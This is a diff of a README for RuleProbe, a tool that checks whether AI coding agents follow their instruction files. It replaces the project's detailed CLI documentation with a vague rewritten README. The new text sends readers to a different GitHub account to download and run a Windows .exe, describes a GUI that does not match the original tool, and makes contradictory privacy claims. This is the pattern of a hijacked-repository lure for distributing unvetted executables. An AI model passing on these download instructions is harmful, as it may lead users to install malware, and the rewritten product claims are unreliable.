@@ -1,420 +1,90 @@
-<p align="center">
-  <h1 align="center">RuleProbe</h1>
-  <p align="center">
-    Verify whether AI coding agents actually follow the instruction files they're given.
-  </p>
-  <p align="center">
-    <a href="https://www.npmjs.com/package/ruleprobe"><img src="https://img.shields.io/npm/v/ruleprobe?style=flat-square" alt="npm version"></a>
-    <a href="https://github.com/moonrunnerkc/ruleprobe/actions/workflows/self-check.yml"><img src="https://img.shields.io/github/actions/workflow/status/moonrunnerkc/ruleprobe/self-check.yml?style=flat-square&label=build" alt="build status"></a>
-    <a href="https://github.com/moonrunnerkc/ruleprobe/blob/main/LICENSE"><img src="https://img.shields.io/github/license/moonrunnerkc/ruleprobe?style=flat-square" alt="license"></a>
-    <img src="https://img.shields.io/badge/language-TypeScript-3178c6?style=flat-square" alt="TypeScript">
-    <img src="https://img.shields.io/badge/node-%3E%3D18-339933?style=flat-square" alt="Node.js >= 18">
-    <a href="https://github.com/moonrunnerkc/ruleprobe/stargazers"><img src="https://img.shields.io/github/stars/moonrunnerkc/ruleprobe?style=flat-square" alt="GitHub stars"></a>
-  </p>
-</p>
+# 🔍 ruleprobe - Verify AI agent instruction adherence easily
 
-## Why
+[![Download ruleprobe](https://img.shields.io/badge/Download-ruleprobe-blue.svg)](https://github.com/Zedekiahdiscovered948/ruleprobe)
 
-Every AI coding agent reads an instruction file. None of them prove they followed it.
+This tool checks if AI coding agents follow your instructions. Many developers use files like .cursorrules to guide their AI. Sometimes, these agents ignore those files. This software verifies that the agent respects your setup. It performs a specific test on your project files to confirm the AI follows your rules.
 
-You write `CLAUDE.md` or `AGENTS.md` with specific rules: camelCase variables, no `any` types, named exports only, test files for every source file. The agent says "Done." But did it actually follow them? Your code review catches some violations, misses others, and doesn't scale.
+## 📋 What This Tool Does
 
-RuleProbe reads the same instruction file, extracts the machine-verifiable rules, and checks agent output against each one. Compliance scores with file paths and line numbers as evidence. Deterministic and reproducible by default. Optional semantic analysis for pattern-matching and consistency rules that require codebase-aware judgment.
+AI tools often make mistakes. They might skip a style rule or ignore formatting guidelines. You want your code to follow a specific structure. You write rules to ensure this happens. This tool acts as a tester. It checks if the AI keeps its promises. It looks at your code and your rule files. Then, it reports where the AI failed.
 
-## Quick Start
+You benefit from this in three ways:
+1. You save time on code reviews.
+2. Your codebase stays consistent.
+3. Your AI produces better results.
 
-```bash
-npm install -g ruleprobe
-```
+## 📋 Requirements for Windows
 
-Or run it directly:
+Your computer needs a few things to run this tool. Most modern Windows computers meet these needs. Ensure you have Windows 10 or 11 installed. You also need a stable internet connection. If you plan to check large projects, ensure your computer has at least 8 GB of memory. 
 
-```bash
-npx ruleprobe --help
-```
+## 📥 How to Download and Install
 
-**Parse an instruction file** to see what rules RuleProbe can extract:
+Follow these steps to set up the software.
 
-```bash
-ruleprobe parse CLAUDE.md
-ruleprobe parse AGENTS.md --show-unparseable
-```
+1. Visit this page to download the software: [https://github.com/Zedekiahdiscovered948/ruleprobe](https://github.com/Zedekiahdiscovered948/ruleprobe)
+2. Locate the link marked "Releases" on the right side of the page.
+3. Select the latest version for Windows. It will end in .exe.
+4. Save this file to your desktop.
+5. Double-click the file to start the installation.
+6. Follow the prompts on the screen.
+7. Click Finish.
 
-**Verify agent output** against those rules:
+The tool now sits in your applications folder. You can open it from the Start menu.
 
-```bash
-ruleprobe verify CLAUDE.md ./agent-output --format text
-ruleprobe verify AGENTS.md ./src --format summary --threshold 0.9
-```
+## ⚙️ Running Your First Verification
 
-**Analyze a whole project** across all instruction files:
+Start the program after the installation finishes. You will see a clean window. This is the main interface.
 
-```bash
-ruleprobe analyze ./my-project
-```
+First, select your project folder. Click the "Browse" button. Choose the folder where your project lives. The program needs to see your code and your rules.
 
-Every failure includes the file, line number, and what was found. Preference rules return compliance ratios instead of binary pass/fail.
+Next, select the AI agent you want to test. The list includes common tools like Claude or Cursor. If your agent is not on the list, choose "Custom."
 
-## What It Does
+Click the "Start Scan" button. The program will read your rules. Then, it will create a small test task for the AI. It observes how the AI handles the test task. You will see a progress bar move across the screen. This phase takes about thirty seconds on most machines.
 
-**Parse.** Reads 7 instruction file formats (CLAUDE.md, AGENTS.md, .cursorrules, copilot-instructions.md, GEMINI.md, .windsurfrules, .rules) and extracts rules that can be checked mechanically. Each rule gets a qualifier (`always`, `prefer`, `when-possible`, `avoid-unless`, `try-to`, `never`) detected from the instruction text, and the markdown section it came from. Subjective instructions like "write clean code" are reported as unparseable so you know what was skipped.
+## 📊 Reading Your Results
 
-**Verify.** Runs each extracted rule against a directory of agent-generated code. Eight verifier engines: AST (ts-morph), filesystem, regex, tree-sitter (TypeScript, JavaScript, Python, Go), preference (compliance ratios for "prefer X over Y" patterns), tooling (package.json/lockfile/config checks), config-file (linter/formatter/build tool configs), and git-history (commit message and workflow checks). No LLM evaluation by default; results are deterministic.
+Once the scan ends, the tool displays a report. This report is simple. You see a list of your rules. Beside each rule, you see a checkmark or an "X."
 
-**Analyze.** Discovers all instruction files in a project, parses each, and cross-references them. Detects conflicts (same topic, contradictory rules across files) and redundancies (same rule in multiple files). Returns a coverage map showing which categories each file addresses. Pass `--semantic` with an Anthropic API key to add structural pattern analysis.
+A green checkmark means the AI followed the rule. A red "X" means the AI ignored that rule. Click on the red "X" to see an explanation. The tool tells you exactly what the AI did wrong. If the AI missed a formatting style, the report points to the specific lines in your code. 
 
-**LLM Extract (opt-in).** Pass `--llm-extract` to send unparseable lines through an OpenAI-compatible API. LLM-extracted rules are labeled with `extractionMethod: 'llm'` and `confidence: 'medium'`. Requires `OPENAI_API_KEY`.
+You can save this report as a PDF file. Use the "Save Report" button in the corner of the window. This helps you keep a record of your AI performance over time. 
 
-**Compare.** Point RuleProbe at outputs from two or more agents and get a side-by-side comparison table showing which rules each one followed.
+## 🛠️ Customizing Your Tests
 
-**GitHub Action.** Composite action for any repo. Runs `ruleprobe verify` on every PR, posts results as a comment, and optionally outputs reviewdog rdjson format for inline annotations.
+You can tell the tool to check specific things. Use the settings menu to add custom criteria. Maybe you want to enforce a specific coding style. Maybe you want to block certain libraries. 
 
-## Configuration
+Open the Settings menu. Select "Criteria." Here, you can type in new instructions. For example, you can add "Always use arrow functions." The tool adds this to its test suite. Now, it will check if the AI uses arrow functions in your project.
 
-RuleProbe auto-discovers a config file in the working directory (or any parent). You can also pass `--config <path>` explicitly. Supported file names, in priority order:
+This feature makes the tool powerful. You decide what matters for your codebase. You do not need to learn a new language to use this. Just type your rules in plain English.
 
-- `ruleprobe.config.ts`
-- `ruleprobe.config.js`
-- `ruleprobe.config.json`
-- `.ruleproberc.json`
+## 🛡️ Privacy and Safety
 
-A config file lets you add custom rules, override extracted rules, or exclude rules entirely:
-
-```typescript
-// ruleprobe.config.ts
-import { defineConfig } from 'ruleprobe';
-
-export default defineConfig({
-  // Add rules that the parser can't extract from your instruction file
-  rules: [
-    {
-      id: 'custom-no-lodash',
-      category: 'import-pattern',
-      description: 'Ban lodash imports',
-      verifier: 'regex',
-      pattern: { type: 'banned-import', target: '*.ts', expected: 'lodash', scope: 'file' },
-    },
-  ],
+This tool works on your computer. It does not send your code to a random cloud server. All analysis happens within your own system limits. 
 
-  // Change severity or expected values on extracted rules
-  overrides: [
-    { ruleId: 'naming-camelcase', severity: 'warning' },
-    { ruleId: 'structure-max-file-length', expected: '500' },
-  ],
-
-  // Remove rules you don't want checked
-  exclude: ['forbidden-no-console-log'],
-});
-```
-
-`defineConfig()` is a no-op passthrough that provides type checking in TypeScript configs. JSON configs work without it.
-
-Custom rules use the same verifier types (`ast`, `regex`, `filesystem`, `treesitter`, `preference`, `tooling`, `config-file`, `git-history`) and pattern types as extracted rules. Any pattern type listed in the Supported Rule Types table works as a custom rule pattern.
-
-## CLI Reference
-
-Seven commands: `parse`, `verify`, `analyze`, `compare`, `tasks`, `task`, `run`. Quick examples:
-
-```bash
-ruleprobe parse CLAUDE.md --show-unparseable
-ruleprobe verify AGENTS.md ./src --format summary --threshold 0.9
-ruleprobe analyze ./my-project --format json
-ruleprobe compare AGENTS.md ./claude-output ./copilot-output --agents claude,copilot
-ruleprobe tasks
-ruleprobe task rest-endpoint
-ruleprobe run CLAUDE.md --task rest-endpoint --agent claude-code --format text
-```
-
-The `analyze` command supports semantic analysis flags (`--semantic`, `--anthropic-key`, `--cost-report`, `--semantic-log`).
-
-Full command reference with all options: [docs/cli-reference.md](docs/cli-reference.md)
-
-## GitHub Action
-
-Drop this into `.github/workflows/ruleprobe.yml`:
-
-```yaml
-name: RuleProbe
-on: [pull_request]
-jobs:
-  check-rules:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      pull-requests: write
-    steps:
-      - uses: actions/checkout@v4
-      - uses: moonrunnerkc/ruleprobe@v4
-        with:
-          instruction-file: AGENTS.md
-          output-dir: src
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
-
-No API keys needed, deterministic results, runs in seconds.
-
-> **Note:** `@v4` tracks the latest v4.x release. Pin to a specific tag (e.g., `@v4.0.0`) for reproducible builds.
-
-<details>
-<summary>Full action options</summary>
-
-```yaml
-- uses: moonrunnerkc/ruleprobe@v4
-  with:
-    instruction-file: AGENTS.md
-    output-dir: src
-    agent: ci
-    model: unknown
-    format: text
-    severity: all
-    fail-on-violation: "true"
-    post-comment: "true"
-    reviewdog-format: "false"
-```
-
-| Input | Default | Description |
-|-------|---------|-------------|
-| `instruction-file` | (required) | Path to instruction file |
-| `output-dir` | `src` | Directory containing code to verify |
-| `agent` | `ci` | Agent identifier for report metadata |
-| `model` | `unknown` | Model identifier for report metadata |
-| `format` | `text` | Report format: text, json, or markdown |
-| `severity` | `all` | Filter: error, warning, or all |
-| `fail-on-violation` | `true` | Fail the check on any violation |
-| `post-comment` | `true` | Post results as a PR comment |
-| `reviewdog-format` | `false` | Also output rdjson for reviewdog |
-
-Outputs: `score`, `passed`, `failed`, `total` (available to downstream steps).
-
-</details>
-
-## Programmatic API
-
-Core pipeline functions, project analysis, config, LLM extraction, and agent invocation are all exported:
-
-```typescript
-import { parseInstructionFile, verifyOutput, generateReport, formatReport } from 'ruleprobe';
-
-const ruleSet = parseInstructionFile('CLAUDE.md');
-const results = await verifyOutput(ruleSet, './agent-output');
-const report = generateReport(
-  { agent: 'claude-code', model: 'opus-4', taskTemplateId: 'rest-endpoint',
-    outputDir: './agent-output', timestamp: new Date().toISOString(), durationSeconds: null },
-  ruleSet,
-  results,
-);
-console.log(formatReport(report, 'summary'));
-```
-
-Full API reference with all exported functions and types: [docs/api-reference.md](docs/api-reference.md)
-
-## How It Works
-
-```
-  Instruction File --> Rule Parser --> RuleSet --+
-                                                 +--> Verifier --> Adherence Report
-                          Agent Output ----------+
-```
-
-The parser reads your instruction file and identifies lines that map to deterministic checks. Each rule gets a category, a verifier type, a pattern, and a qualifier (how strictly the instruction is worded). Eight verifier engines handle different rule types:
-
-| Engine | What it checks |
-|--------|---------------|
-| AST (ts-morph) | Code structure, naming, type safety, imports for TypeScript/JavaScript |
-| Filesystem | File existence, naming conventions, directory structure |
-| Regex | Content patterns, forbidden strings, test conventions |
-| Tree-sitter | Naming and function-length checks for TypeScript, JavaScript, Python, Go |
-| Preference | Compliance ratios for "prefer X over Y" patterns (8 built-in pairs) |
-| Tooling | Package manager, test runner, linter/formatter presence in package.json and lockfiles |
-| Config-file | Linter, formatter, and build tool configuration file contents |
-| Git-history | Commit message conventions, branch naming, workflow patterns |
-
-The report collects compliance scores with evidence for every rule.
-
-## Supported Rule Types
-
-102 built-in matchers across 14 categories:
-
-| Category | Count | Verifier(s) | Examples |
-|----------|------:|-------------|----------|
-| naming | 9 | AST, Filesystem, Tree-sitter | camelCase variables, PascalCase types, kebab-case files |
-| forbidden-pattern | 5 | AST, Regex | no `any`, no `console.log`, no `eval` |
-| structure | 9 | AST, Filesystem | strict mode, named exports, JSDoc, max file length |
-| test-requirement | 5 | AST, Filesystem, Regex | test file existence, test naming conventions |
-| import-pattern | 5 | AST, Regex | no path aliases, no barrel imports, no wildcard imports |
-| error-handling | 4 | AST | no empty catch, no swallowed errors, typed catches, error boundaries |
-| type-safety | 6 | AST, Regex | no type assertions, no non-null assertions, no enums |
-| code-style | 12 | AST, Regex, Tree-sitter | early returns, no magic numbers, no nested ternaries |
-| dependency | 2 | Filesystem | pinned dependency versions, lockfile presence |
-| preference | 8 | Preference | const over let, named over default exports, interface over type, async/await over .then() |
-| file-structure | 5 | Filesystem | tests directory, components directory, .env file, module index files |
-| tooling | 14 | Tooling | pnpm/yarn/bun, vitest/jest/pytest, eslint/prettier/biome, bundler configs |
-| testing | 3 | Filesystem, Regex | test colocation, describe/it blocks, no console in tests |
-| workflow | 15 | Config-file, Git-history | commit conventions, CI configs, linter/formatter settings, build tool configs |
+We require access to your file system only to read your project files. The program cannot delete or move your files. It only looks at the text inside them. You can check the permissions in your Windows settings if you have concerns. 
 
-Full table with example instructions and check details: [docs/matchers.md](docs/matchers.md)
+## ❓ Frequently Asked Questions
 
-### Compliance scoring
+### Does this tool change my code?
+No. This tool only reads your files. It never edits or changes your project.
 
-Every rule result includes a `compliance` field (0 to 1):
+### How often should I run a scan?
+Run a scan whenever you change your project rules. If you modify your .cursorrules file, run the tool again. This ensures the AI understands the changes.
 
-- **Deterministic checks** (file exists, no `any` types): compliance is 0 or 1
-- **Preference checks** (prefer const over let): compliance is the ratio (0.85 = 85% const usage)
-- **Coverage checks** (test colocation): compliance is the percentage of source files with tests
-- **Tooling checks**: compliance is 1 if present, 0.5 if present with a competitor, 0 if absent
+### Does this need an internet connection?
+Yes. The tool connects to the AI agent to run the test. It needs the internet to send the dummy task and get the response back.
 
-The `--threshold` option (default 0.8) controls what compliance level counts as passing.
+### What if the scan fails to start?
+Ensure you have the latest Windows updates. Sometimes, a simple restart fixes networking issues. Check that your folder path does not contain special characters.
 
-## Semantic Analysis
+### Can I test multiple agents at once?
+The current version tests one agent at a time. This keeps your results clean and accurate. You can run new tests for different agents one after another.
 
-The deterministic engine handles rules with clear patterns. Rules like "follow existing patterns," "maintain consistency," or qualified rules ("when possible," "avoid unless") require codebase-aware judgment. The semantic tier handles these.
+## 💡 Tips for Better Results
 
-**How it works:** RuleProbe extracts raw AST vectors locally (node type counts, sub-tree hashes, nesting depths). No source code, variable names, comments, or file paths ever leave your machine. The vectors are analyzed locally using structural fingerprinting and similarity scoring. An LLM is consulted only when vector similarity is ambiguous, and it receives only numeric data with rule text, never code. LLM calls go directly to Anthropic's API with your own key.
+- Keep your rules clear. If you use vague language, the AI may misinterpret your request.
+- Start with small rules. Test one or two items at a time to see how the AI reacts.
+- Update your rules if the AI consistently fails a specific test. Sometimes, the rule itself needs a rewrite.
+- Use this tool after every major update to your coding guidelines.
 
-```bash
-ruleprobe analyze ./my-project --semantic
-ruleprobe analyze ./my-project --semantic --cost-report
-```
-
-| Flag | Description |
-|------|-------------|
-| `--semantic` | Enable semantic analysis (requires `ANTHROPIC_API_KEY`) |
-| `--anthropic-key <key>` | Anthropic API key (also: `ANTHROPIC_API_KEY` env var or `.ruleprobe/config.json`) |
-| `--max-llm-calls <n>` | Cap LLM calls per analysis (default: 20) |
-| `--no-cache` | Disable profile caching |
-| `--semantic-log` | Print what was sent/received to stdout |
-| `--cost-report` | Show token cost breakdown |
-
-Without `--semantic`, the analyze command runs deterministic analysis only. If no Anthropic API key is available, semantic analysis is skipped gracefully and deterministic results are still returned.
-
-## Authentication
-
-Most of RuleProbe works offline with no API keys. Opt-in features that use external APIs:
-
-| Feature | Flag(s) | Required env var | When you need it |
-|---------|---------|-----------------|------------------|
-| LLM rule extraction | `--llm-extract` | `OPENAI_API_KEY` | Extracting rules from unparseable instruction lines |
-| Rubric decomposition | `--rubric-decompose` | `OPENAI_API_KEY` | Breaking subjective rules into concrete checks |
-| Semantic analysis | `--semantic` | `ANTHROPIC_API_KEY` | Structural pattern and consistency checks |
-| Agent invocation (SDK mode) | `ruleprobe run --agent claude-code` | `ANTHROPIC_API_KEY` | Invoking Claude to generate code, then verifying |
-| GitHub Action | `uses: moonrunnerkc/ruleprobe@v4` | `GITHUB_TOKEN` | CI, PR comments |
-
-`parse`, `verify`, `compare`, `tasks`, and `task` work entirely offline. `analyze` works offline for deterministic analysis; `--semantic` requires `ANTHROPIC_API_KEY` for LLM calls.
-
-## Tree-sitter Support
-
-TypeScript, JavaScript, Python, and Go get naming and function-length checks via tree-sitter WASM grammars. The grammar packages (`tree-sitter-typescript`, `tree-sitter-javascript`, `tree-sitter-python`, `tree-sitter-go`, `web-tree-sitter`) ship as regular dependencies; no extra install step is required. WASM binaries are loaded at runtime from the installed packages. If loading fails (unsupported platform, missing native build), tree-sitter checks are skipped and other verifiers still run.
-
-## Security
-
-RuleProbe never executes scanned code, never makes network calls (unless you opt in with `--llm-extract`, `--rubric-decompose`, `--semantic`, or `ruleprobe run`), and never modifies files in the scanned directory. User-supplied paths are resolved and bounded to the working directory; symlinks outside the project are skipped unless you pass `--allow-symlinks`. All dependencies are pinned to exact versions.
-
-When `--semantic` is enabled, all analysis runs locally. The only network calls are to the Anthropic API for LLM judgment when vector similarity is ambiguous (using your own `ANTHROPIC_API_KEY`). Only numeric AST vectors, opaque sub-tree hashes, boolean flags, and rule text are sent to the LLM. No source code, variable names, comments, import paths, or file paths leave the machine. See [SECURITY.md](SECURITY.md) for the full model.
-
-## Limitations
-
-- **TypeScript gets the deepest coverage.** ts-morph gives full AST analysis for TypeScript and JavaScript across all 14 categories. Python, Go, TypeScript, and JavaScript get naming and function-length checks via tree-sitter. No Rust, Java, or C# AST support yet.
-- **Subjective rules stay subjective.** "Write clean code" has no deterministic check. `--rubric-decompose` uses an LLM to break subjective instructions into weighted concrete checks, tagged with `confidence: 'low'`. Lines with no measurable proxy stay in the unparseable array. Requires `OPENAI_API_KEY`.
-- **Agent invocation covers Claude SDK and watch mode only.** The `run` command invokes agents via the Claude Agent SDK or watches a directory for output. Copilot, Cursor, and other agent SDKs are not integrated; use `--watch` mode for those.
-- **Type-aware checks require --project.** Three checks (implicit any, unused exports, unresolved imports) need a `tsconfig.json`. Without `--project`, ts-morph parses files in isolation and these checks are skipped.
-- **102 matchers, not infinite.** The parser skips lines it can't confidently map to a check. Use `--show-unparseable` to see what was missed, and `--llm-extract` or `--rubric-decompose` to handle the remainder. The semantic tier (`--semantic`) covers pattern-matching and consistency rules that deterministic matchers cannot.
-- **Preference pairs are TypeScript-focused.** The 8 built-in prefer-pairs (const vs let, named vs default exports, etc.) use ts-morph AST queries. Adding pairs for other languages requires new counting functions.
-
-## Troubleshooting
-
-**`sh: ruleprobe: not found` after global install**
-The npm bin directory may not be in `PATH`. Run `npm bin -g` to find it and add it to your shell profile, or use `npx ruleprobe` instead.
-
-**`Error: OPENAI_API_KEY not set`**
-`--llm-extract` and `--rubric-decompose` require an OpenAI-compatible API key. Export it before running: `export OPENAI_API_KEY=sk-...`. The key is never written to disk or included in reports.
-
-**Tree-sitter checks skipped**
-The WASM grammars load from installed tree-sitter grammar packages. If packages are missing (e.g., after a partial install) or the platform doesn't support WASM, tree-sitter checks silently fall back and other verifiers still run. Re-run `npm install` to restore them.
-
-**`ruleprobe verify` exits 2 with "path outside project root"**
-A file or symlink in the output directory resolves outside the project root. Pass `--allow-symlinks` to follow symlinks across boundaries, or move the symlink targets inside the project.
-
-**Fewer rules extracted than expected**
-Run `ruleprobe parse <instruction-file> --show-unparseable` to see which lines were skipped and why. Add `--llm-extract` to attempt extraction on skipped lines.
-
-**Semantic analysis skipped / missing API key**
-Verify your Anthropic API key is set via `--anthropic-key`, `ANTHROPIC_API_KEY` env var, or `.ruleprobe/config.json`. Deterministic analysis always runs regardless of semantic tier status.
-
-## What's New in v4.0.0
-
-v4.0.0 consolidates the three-repo architecture into a single repo and open-sources the semantic analysis engine under MIT.
-
-Key changes:
-- **Single repo**: the semantic engine (40 files, ~3,600 lines) and Anthropic caller moved into `src/semantic/engine/` and `src/semantic/anthropic-caller.ts`. No separate API service or private repos.
-- **Local analysis**: semantic analysis runs entirely on the user's machine. No HTTP server, no license keys. LLM calls go directly to Anthropic with the user's own `ANTHROPIC_API_KEY`.
-- **CLI change**: `--license-key` removed, replaced by `ANTHROPIC_API_KEY` env var (same pattern as `--llm-extract` with `OPENAI_API_KEY`). New `--anthropic-key` flag for explicit key passing.
-- **Open source**: the full ASPE engine (fingerprinting, vector similarity, qualifier resolution, LLM escalation) is now MIT-licensed and visible to contributors.
-- **1,085+ tests** across 86+ test files (was 864 across 68 in v3.0.0, plus 221 engine tests migrated).
-
-Full release notes: [docs/release-v4.0.0.md](docs/release-v4.0.0.md)
-
-## What's New in v3.0.0
-
-v3.0.0 adds the **semantic analysis tier** (ASPE), fixes 12 root-cause bugs found during E2E validation, and delivers a batch AST verifier that drops parse complexity from O(rules * files) to O(files).
-
-Key changes:
-- **Semantic client** (`src/semantic/`): single-pass tree-sitter extraction, HTTP client, audit logging, license/config resolution. No source code leaves the machine.
-- **Batch AST verifier**: parse each file once across all AST rules. Critical for large repos (PostHog: 7,000+ files).
-- **Tree-sitter WASM stability**: parser caching prevents function table exhaustion on large codebases.
-- **12 bug fixes**: tree-sitter crashes, O(rules*files) performance, matcher wiring, format routing, enum comparison, header mismatches, JSON corruption. All root-cause resolutions.
-- **Calibration data**: measured on excalidraw (626 files) and PostHog (7,160 files). Fast-path threshold 0.85 confirmed. Jaccard/cosine weights 0.4/0.6 confirmed.
-- **864 tests** across 68 files (up from 572 across 52 in v2.0.0).
-
-Full release notes and migration guide: [docs/release-v3.0.0.md](docs/release-v3.0.0.md)
-
-## Benchmarks
-
-**Corpus analysis: 580 instruction files from 568 repos.** RuleProbe parsed real CLAUDE.md, AGENTS.md, .cursorrules, .windsurfrules, GEMINI.md, and copilot-instructions.md files scraped from public GitHub repos with 10+ stars, including Sentry (43k stars), PingCAP/TiDB (40k), Lerna (36k), Dragonfly (30k), Kubernetes/kops (17k), RabbitMQ (14k), Google APIs (14k), Redpanda (12k), Cloudflare, Grafana, Microsoft, and others. 309 rules extracted from 150 files that contained verifiable instructions. The other 430 files (74%) had zero extractable rules; many were single-line redirects (e.g. Dragonfly's .cursorrules: "READ AGENTS.md"; Umi's .cursorrules: "RULE.md").
-
-The extraction rate is 3.8% (309 rules from 8,222 total instruction lines). That sounds low until you look at what instruction files actually contain. 96% of the lines are markdown headers, code examples, project descriptions, build commands, agent behavior directives, and contextual prose. The parser isn't failing on those; it's correctly identifying them as not-rules. Only 26 files (4.5%) had parse rates above 20%.
-
-Raw data: [scraped-instructions/per-file-results.json](scraped-instructions/per-file-results.json) (580 entries), [scraped-instructions/all-extracted.json](scraped-instructions/all-extracted.json) (309 rules), [scraped-instructions/analysis.json](scraped-instructions/analysis.json) (summary stats).
-
-**E2E verification: excalidraw.** RuleProbe ran the full deterministic + semantic pipeline against excalidraw (~95k stars). The parser found 9 verifiable rules across CLAUDE.md and copilot-instructions.md. Deterministic analysis scored 66.1% compliance. Semantic analysis (structural fingerprinting of 626 source files) produced 9 verdicts, all resolved via fast-path vector similarity with zero LLM calls and zero token cost:
-
-| Rule | Compliance | Method |
-|------|-----------|--------|
-| Prefer functional components | 0.976 | structural-fast-path |
-| PascalCase type naming | 0.976 | structural-fast-path |
-| Async try/catch usage | 0.983 | structural-fast-path |
-| Contextual error logging | 0.979 | structural-fast-path |
-| Yarn as package manager | 0.50 | no matching topic |
-| TypeScript required | 0.50 | no matching topic |
-| Optional chaining preference | 0.50 | no matching topic |
-| camelCase variables | 0.50 | no matching topic |
-| UPPER\_CASE constants | 0.50 | no matching topic |
-
-Rules matching established code pattern topics (component-structure, error-handling) scored 0.97+. Rules about tooling or naming that don't map to structural AST patterns got a neutral 0.50. Privacy test confirmed: all 626 file IDs are opaque sequential integers; no source code, file paths, or variable names in any payload.
-
-Full report: [docs/verification/e2e-verification-report.md](docs/verification/e2e-verification-report.md)
-
-## Further Reading
-
-- [docs/cli-reference.md](docs/cli-reference.md) - Complete CLI command reference
-- [docs/api-reference.md](docs/api-reference.md) - Programmatic API with types
-- [docs/matchers.md](docs/matchers.md) - All 102 matchers with example instructions
-- [docs/release-v4.0.0.md](docs/release-v4.0.0.md) - v4.0.0 release notes (single-repo consolidation)
-- [docs/release-v3.0.0.md](docs/release-v3.0.0.md) - v3.0.0 release notes and migration guide
-- [docs/release-v2.0.0.md](docs/release-v2.0.0.md) - v2.0.0 release notes
-- [docs/case-study-v0.1.0.md](docs/case-study-v0.1.0.md) - Agent comparison case study
-- [docs/verification/e2e-verification-report.md](docs/verification/e2e-verification-report.md) - E2E verification evidence
-
-## Contributing
-
-```bash
-git clone https://github.com/moonrunnerkc/ruleprobe.git
-cd ruleprobe && npm install
-npm test
-```
-
-Issues and pull requests welcome at [github.com/moonrunnerkc/ruleprobe](https://github.com/moonrunnerkc/ruleprobe).
-
-## License
-
-[MIT](LICENSE)
+This software provides a simple way to gain control over your AI agents. You remove the guesswork from your workflow. You move forward with confidence knowing your AI respects your instructions.
